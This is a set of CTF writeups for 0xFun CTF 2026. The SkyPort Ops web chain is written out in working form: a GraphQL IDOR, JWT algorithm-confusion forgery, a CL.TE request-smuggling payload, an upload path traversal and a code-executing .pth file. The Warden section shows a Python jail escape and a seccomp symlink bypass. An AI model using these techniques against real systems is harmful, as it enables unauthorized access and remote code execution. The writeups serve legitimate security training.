# 0xFun CTF 2026 Writeups

A collection of step-by-step writeups for selected challenges from **0xFun CTF 2026**, rewritten from rough notes into a cleaner GitHub-friendly format.

---

## Table of Contents

- [Web](#web)
  - [SkyPort Ops](#skyport-ops)
- [OSINT](#osint)
  - [GeoSkill](#geoskill)
  - [Lookup 0xFUN](#lookup-0xfun)
  - [MultiVerse / Where's Franklin?](#multiverse--wheres-franklin)
  - [Tragedy](#tragedy)
  - [Insanity 1](#insanity-1)
  - [Insanity Revenge](#insanity-revenge)
  - [Malware Analysis 1/2/3](#malware-analysis-123)
- [Pwn](#pwn)
  - [Warden](#warden)
  - [What You Have](#what-you-have)
  - [Fridge](#fridge)
  - [bit_flips](#bit_flips)
  - [chaos](#chaos)
  - [67](#67)
  - [Phantom](#phantom)
- [Crypto](#crypto)
  - [BitStorm](#bitstorm)
  - [MeOwl ECC](#meowl-ecc)
  - [The Slot Whisperer](#the-slot-whisperer)
  - [The Roulette Conspiracy](#the-roulette-conspiracy)
  - [The Fortune Teller](#the-fortune-teller)
  - [The Fortune Teller's Revenge](#the-fortune-tellers-revenge)
- [Forensics](#forensics)
  - [Ghost](#ghost)
  - [PrintedParts](#printedparts)
  - [kd>](#kd)
  - [Tesla](#tesla)
  - [DTMF](#dtmf)
  - [Nothing Expected](#nothing-expected)

---

# Web

## SkyPort Ops

**Category:** Web  
**Difficulty:** Medium  
**Points:** 250  
**Solves:** 130  
**Flag:** `0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}`

### Description

The target was an airport operations portal named **SkyPort Ops**, supposedly restricted to Security Officers only.  
The challenge required chaining several vulnerabilities together to escalate privileges and retrieve the flag.

### Solution Overview

The exploit chain had six stages:

1. Leak a staff JWT through GraphQL Relay
2. Extract the RSA public key
3. Forge an admin JWT using algorithm confusion
4. Smuggle a request past the gateway
5. Abuse path traversal in the upload endpoint
6. Trigger code execution with a malicious `.pth` file

### Step 1 — Leak a staff JWT via GraphQL Relay

The GraphQL API exposed a `StaffNode` type with an `accessToken` field.  
Using Strawberry Relay’s `node` query, I could directly request an object by its global Relay ID.

For user ID `2`, the Relay ID was:

```text
base64("StaffNode:2") = U3RhZmZOb2RlOjI=
```

So the query became:

```graphql
{
  node(id: "U3RhZmZOb2RlOjI=") {
    ... on StaffNode {
      username
      accessToken
    }
  }
}
```

This returned the JWT for `officer_chen`.

### Step 2 — Extract the RSA public key

After decoding the leaked JWT, I found a `jwks_uri` field pointing to an internal endpoint:

```text
/api/<random_hex>
```

Requesting that endpoint returned the RSA public key in PEM format.

### Step 3 — Forge an admin JWT with algorithm confusion

The backend decoded tokens using logic equivalent to:

```python
jose_jwt.decode(token, RSA_PUBLIC_DER, algorithms=None)
```

Since `algorithms=None`, the server did not strictly enforce the signing algorithm.  
That allowed me to create a JWT with header `alg: HS256` and sign it using the RSA public key bytes as the HMAC secret.

```python
admin_token = jose_jwt.encode(
    {"sub": "admin", "role": "admin"},
    der_bytes,
    algorithm="HS256"
)
```

The server accepted this forged token as valid, which gave admin privileges.

### Step 4 — Bypass the gateway using CL.TE request smuggling

The frontend gateway blocked access to `/internal/*`, so direct requests to sensitive internal routes failed.

The bypass used a **CL.TE desync**:

- the gateway trusted `Content-Length`
- the backend trusted `Transfer-Encoding: chunked`

A smuggled request allowed the backend to process a hidden second request that the gateway never inspected.

Conceptually, the payload looked like this:

```http
POST / HTTP/1.1
Content-Length: <total>
Transfer-Encoding: chunked

0\r\n\r\n
POST /internal/upload HTTP/1.1
Authorization: Bearer <admin_token>
...multipart body...
```

That reached `/internal/upload` successfully.

### Step 5 — Exploit path traversal in file upload

The upload handler trusted filenames too much.  
If the filename began with `/`, it used that value directly as the destination path:

```python
if filename.startswith("/"):
    destination = Path(filename)
```

That meant I could write files anywhere on disk.

I uploaded a malicious `.pth` file to:

```text
/home/skyport/.local/lib/python3.11/site-packages/evil.pth
```

Contents:

```python
import os; os.system('/flag > /tmp/skyport_uploads/flag.txt')
```

### Step 6 — Trigger execution through worker restart

Python automatically processes `.pth` files when the interpreter starts.  
The server used Hypercorn with:

```text
--max-requests 100
```

So after sending 200+ requests, the workers restarted, Python loaded the malicious `.pth` file, and the command executed.

Then I retrieved:

```text
GET /uploads/flag.txt
```

and got:

```text
0xfun{0ff1c3r_5mugg13d_p7h_1nt0_41rp0r7}
```

### Vulnerability Summary

| Step | Vulnerability | Impact |
|------|---------------|--------|
| 1 | GraphQL Relay IDOR | Leaked staff JWT |
| 2 | Public key exposure | Provided material for JWT forgery |
| 3 | JWT algorithm confusion | Forged admin token |
| 4 | CL.TE request smuggling | Bypassed gateway restrictions |
| 5 | Path traversal in upload | Arbitrary file write |
| 6 | `.pth` startup execution | Remote code execution |

---

# OSINT

## GeoSkill

**Category:** OSINT

This was a 7-location GeoGuessr-style challenge.

### Step-by-step

**Location 1**  
The image showed **Christ the Redeemer** in Rio de Janeiro, Brazil.  
This was solvable through reverse image search or by searching famous Jesus statues.

**Location 2**  
The key clue was a bank visible in the image.  
Searching the bank name led to **Lagos, Nigeria**.

**Location 3**  
Reverse image search immediately pointed to **Christmas Island**.

**Location 4**  
This one was in **Ehime Prefecture, Japan**.  
A useful clue was the style of blue cycling lane markings, which are especially associated with Ehime.

**Location 5**  
The intended solution was to identify the Google Street View car model visible in the image.  
Using a Google vehicle reference list led to the correct answer:

```text
Kongebrovej
```

**Location 6**  
The hint referenced the Grand Canyon.  
Following the river in Street View near the most likely area revealed the location:

```text
///sailor.cascading.mower
```

**Location 7**  
This one was **Bermuda**.  
Clues included left-side driving, English usage, and a visible copyright date the author forgot to remove.

---

## Lookup 0xFUN

**Category:** OSINT  
**Flag:** `0xfun{4ny_1nfo_th4ts_pub1cly_4cc3ss1bl3_1s_0S1NT}`

### Step-by-step

1. The challenge name suggested checking publicly available infrastructure related to `0xfun`.
2. Querying DNS records for `ctf.0xfun.org` revealed a TXT record.
3. The TXT record directly contained the flag.

---

## MultiVerse / Where's Franklin?

**Category:** OSINT  
**Flag:** `0xfun{sp0t1fy_pl4yl1st_3xt3nd_M0R3_TR4X}`

### Step-by-step

1. The username `Massive-Equipment393` was identified.
2. That account led to Reddit activity.
3. A Reddit comment contained Base58-encoded data.
4. Decoding that led to Spotify playlists.
5. The final flag was assembled from:
   - Base64 in a playlist description
   - Base58 data from Reddit
   - the first letters of songs in a second playlist

---

## Tragedy

**Category:** OSINT  
**Flag:** `0xfun{UPS_Flight_2976_fall1n_d0wn}`

### Step-by-step

1. This challenge was related to the same identity trail as MultiVerse.
2. A Reddit comment on an aviation thread contained hundreds of zero-width Unicode characters.
3. Those characters encoded the flag using quaternary-style steganography.
4. Decoding the hidden Unicode characters revealed the flag.

---

## Insanity 1

**Category:** OSINT  
**Flag:** `0xfun{1ns4n1ty_d15c0rd_1_thr0ugh_r0l3s}`

### Step-by-step

1. The Discord invite `RUwDQBsSxt` led to the 0xFun Portal server.
2. The flag was not visible in public channels.
3. The intended trick was to enumerate the server data through the Discord API.
4. The flag was hidden in a role name.

---

## Insanity Revenge

**Category:** OSINT  
**Flag:** `0xfun{0m_built_a5_a_G1F}`

### Step-by-step

1. This follow-up challenge used the same Discord server.
2. A custom animated emoji contained the flag.
3. The animation had two frames:
   - Frame 0 showed the visible logo
   - Frame 1 briefly contained the flag
4. Extracting the GIF frames revealed the flag.

---

## Malware Analysis 1/2/3

**Category:** OSINT / Malware

### Malware Analysis 1

**Flag:** `0xfun{3aw.msi}`

1. The IP `172.67.178.15` was used as the starting point.
2. A sandbox report connected it to a malicious MSI file.
3. The filename was:

```text
3aw.msi
```

### Malware Analysis 2

**Flag:** `0xfun{bestiamos.com}`

1. From the same analysis trail, the malicious domain was identified.
2. It resolved to the attacker-controlled IP.
3. The answer was:

```text
bestiamos.com
```

### Malware Analysis 3

**Flag:** `0xfun{61.brr}`

1. Searching the malware hash on another malware analysis platform revealed the original filename.
2. That original filename was:

```text
61.brr
```

---

# Pwn

## Warden

**Category:** Pwn  
**Flag:** `0xfun{wh0_w4tch3s_th3_w4rd3n_t0ctou_r4c3}`

### Description

This challenge had two restrictions:

- a Python jail
- a seccomp-based syscall supervisor

The solution required escaping the Python jail and then bypassing the seccomp pathname filter.

### Step 1 — Escape the Python jail

The jail blocked:

- `import`
- `eval` / `exec`
- `open`
- direct dunder access like `__subclasses__`

The bypass was to dynamically build dunder names using:

```python
du = '_' * 2
```

Then `getattr()` could be used to access blocked attributes.  
Walking through `object.__subclasses__()` led to `_frozen_importlib.BuiltinImporter`, which was then used to load `posix`.

```python
du = '_'*2
subs = getattr(object, du+'subclasses'+du)()
for t in subs:
    if getattr(t, du+'name'+du) == 'BuiltinImporter' and getattr(t, du+'module'+du) == '_frozen_importlib':
        BI = t
        break
p = BI.load_module('posix')
```

That restored low-level filesystem access.

### Step 2 — Bypass the seccomp filter using a symlink

The warden checked whether a syscall pathname started with `/flag`.  
But it only validated the literal path string and did not resolve symlinks.

Also, `symlink` was not blocked.

So I created a symlink in `/tmp`:

```python
p.chdir('/tmp')
p.symlink('/flag', 'x')
```

Then I opened the harmless-looking filename:

```python
fd = p.open('x', 0)
data = p.read(fd, 65536)
```

The seccomp layer saw `"x"`, while the kernel resolved `x -> /flag`.

This was effectively a **TOCTOU / path resolution mismatch**.

---

## What You Have

**Category:** Pwn  
**Flag:** `0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}`

### Step-by-step

1. The binary had **No RELRO** and **No PIE**.
2. That meant the GOT remained writable and symbol addresses were fixed.
3. The goal was to overwrite `puts@GOT` with the address of `win()`.
4. Later, when the program executed:

```c
puts("Goodbye!");
```

execution jumped to `win()` instead, which printed the flag.

---

## Fridge

**Category:** Pwn  
**Flag:** `0xfun{4_ch1ll1ng_d1sc0v3ry!...}`

### Step-by-step

1. The target was a 32-bit ELF binary.
2. It used `gets()`, giving a classic buffer overflow.
3. The binary already contained both `system@plt` and a `/bin/sh` string.
4. The only subtlety was preserving the saved `ebx` value at offset 40.
5. If `ebx` was corrupted, PIC-relative instructions crashed before control flow reached the overwritten return address.
6. Preserving `ebx` allowed the ret2libc-style chain to work.

---

## bit_flips

**Category:** Pwn  
**Flag:** `0xfun{3_b1t5_15_4ll_17_74k35_70_g37_RC3_safhu8}`

### Step-by-step

1. The program allowed exactly 3 arbitrary bit flips.
2. Two flips were used to change a `FILE` structure’s `_fileno` field from `3` to `0`, redirecting input to stdin.
3. The final bit flip changed the return address so execution landed in `cmd()`.
4. Then `cat flag` was sent through stdin.

---

## chaos

**Category:** Pwn  
**Flag:** `0xfun{l00k5_l1k3_ch479p7_c0uldn7_50lv3_7h15_0n3}`

### Step-by-step

1. The challenge implemented a custom VM with seven opcodes.
2. The `STORE` instruction used a signed comparison with no lower-bound check.
3. That allowed negative offsets and out-of-bounds writes.
4. By using that write primitive, the VM’s function pointer table could be overwritten.
5. Replacing the HALT handler with `system@plt` and triggering opcode `0` led to shell execution.

---

## 67

**Category:** Pwn  
**Flag:** `0xfun{p4cm4n_Syu_br0k3_my_xpl0it_btW}`

### Step-by-step

1. The binary had a heap use-after-free because freeing memory did not clear the stored pointer.
2. That bug was used for tcache poisoning.
3. The final technique involved House of Apple 2 / FSOP against glibc 2.42 with safe-linking.
4. Control flow eventually reached `system(" sh")`.

---

## Phantom

**Category:** Pwn  
**Flag:** `0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}`

### Step-by-step

1. This challenge used a vulnerable Linux kernel module.
2. The bug was a physical page use-after-free.
3. A freed page was reclaimed as a page table entry page using the dirty pagetable technique.
4. That provided arbitrary physical memory read access.
5. Scanning physical memory revealed the flag.

---

# Crypto

## BitStorm

**Category:** Crypto  
**Flag:** `0xfun{L1n34r_4lg3br4_W1th_Z3_1s_Aw3s0m3}`

### Step-by-step

1. The PRNG used a custom 256-byte seed and 32 internal 64-bit words.
2. All transformations were linear over GF(2): XORs, shifts, and rotations.
3. The entire generator could therefore be modeled as matrix multiplication over GF(2).
4. From 60 outputs, enough linear equations were recovered to solve for the internal state.
5. Gaussian elimination solved the resulting system and recovered the flag.

---

## MeOwl ECC

**Category:** Crypto  
**Flag:** `0xfun{n0n_c4n0n1c4l_l1f7s_r_c00l}`

### Step-by-step

1. The elliptic curve used in the challenge was anomalous, meaning its order equaled `p`.
2. That made it vulnerable to Smart’s attack.
3. Recovering the scalar `d` allowed derivation of symmetric keys through SHA-256.
4. Those keys were then used to decrypt DES-CBC and AES-CBC layers to recover the flag.

---

## The Slot Whisperer

**Category:** Crypto  
**Flag:** `0xfun{sl0t_wh1sp3r3r_lcg_cr4ck3d}`

### Step-by-step

1. The generator was an LCG with all parameters known.
2. The outputs shown to the user were `state % 100`.
3. Starting from the first observed spin, possible states were brute-forced.
4. Candidates were checked against the rest of the sequence with early termination.
5. The correct state eventually predicted all future spins.

---

## The Roulette Conspiracy

**Category:** Crypto  
**Flag:** `0xfun{m3rs3nn3_tw1st3r_unr4v3l3d}`

### Step-by-step

1. The challenge used the **Mersenne Twister** PRNG.
2. Each observed output was XORed with `0xCAFEBABE`.
3. Collecting 624 outputs gave enough data to reconstruct the entire internal MT state.
4. First the XOR was undone.
5. Then the outputs were untempered.
6. The reconstructed state was used to clone the generator.
7. That allowed exact prediction of the next 10 outputs.

---

## The Fortune Teller

**Category:** Crypto  
**Flag:** `0xfun{trunc4t3d_lcg_f4lls_t0_lll}`

### Step-by-step

1. The PRNG was a 64-bit LCG.
2. Only the upper 32 bits of each state were revealed.
3. The lower 32 bits of the first state were brute-forced.
4. Candidate states were checked against later outputs.
5. Once the correct state was recovered, the sequence was fully predictable.

---

## The Fortune Teller's Revenge

**Category:** Crypto  
**Flag:** `0xfun{r3v3ng3_0f_th3_f0rtun3_t3ll3r}`

### Step-by-step

1. This challenge reused the same truncated 64-bit LCG idea.
2. The twist was that 100,000 steps occurred between glimpses.
3. The jump and next-state logic were combined into a single affine transformation.
4. A meet-in-the-middle attack over split state bits recovered the internal state.
5. That was enough to reconstruct the flag.

---

# Forensics

## Ghost

**Category:** Forensics  
**Flag:** `0xfun{l4y3r_pr0t3c710n_k3y}`

### Step-by-step

1. The provided file was a PNG image.
2. It contained extra data appended after the `IEND` chunk.
3. Extracting that extra data produced a `7z` archive.
4. The archive was password protected.
5. The password appeared in visible SSTV-decoded text inside the image:

```text
1n73rc3p7_cOnf1rm3d
```

6. Using that password opened the archive and revealed the flag.

---

## PrintedParts

**Category:** Forensics  
**Flag:** `0xfun{this_monkey_has_a_flag}`

### Step-by-step

1. The challenge provided G-code for an Ultimaker S5.
2. The flag was embossed as raised text on a 3D model.
3. Parsing the extrusion path and plotting selected axes exposed the hidden text.
4. The recovered text contained the flag.

---

## kd>

**Category:** Forensics  
**Flag:** `0xfun{wh0_n33ds_sl33p_wh3n_y0u_h4v3_cr4sh_dumps}`

### Step-by-step

**Easy solve:**

```bash
strings crypter.dmp | grep 0xfun
```

This immediately revealed the flag.

**Intended solve:**

1. Open `crypter.dmp` in WinDbg
2. Run:

```text
.ecxr
```

3. Restore the exception context
4. Inspect the `RBX` register
5. Recover the remaining bytes from the stack

---

## Tesla

**Category:** Forensics

### Step-by-step

1. The provided file was a Flipper Zero `.sub` file.
2. The apparent BadUSB/Sub-GHz angle was a decoy.
3. The key data was in `RAW_Data`.
4. That data contained an XOR-encoded script.
5. Using the hint string:

```text
i could be something to this
```

as the XOR key revealed the hidden output.

---

## DTMF

**Category:** Forensics  
**Flag:** `0xfun{Mu1t1_t4p_plu5_dtmf}`

### Step-by-step

1. The WAV file contained 288 DTMF tone bursts.
2. Each burst encoded either `0` or `1`.
3. Decoding the DTMF stream produced binary data.
4. The binary decoded into Base64.
5. The result was then decrypted using a Vigenère key found in WAV metadata:

```text
uhmwhatisthis
```

6. That recovered the flag.

---

## Nothing Expected

**Category:** Forensics  
**Flag:** `0xfun{th3_sw0rd_0f_k1ng_4rthur}`

### Step-by-step

1. The file was a PNG image.
2. It contained a large `tEXt` chunk.
3. That chunk held compressed Excalidraw JSON data.
4. Hidden `freedraw` elements were placed far off-canvas.
5. Those hidden elements spelled the flag.

---

# Final Notes

These writeups were cleaned up from rough notes into a more consistent GitHub format.  
Some entries are full exploit explanations, while others are shorter solution summaries depending on how much detail was originally available.
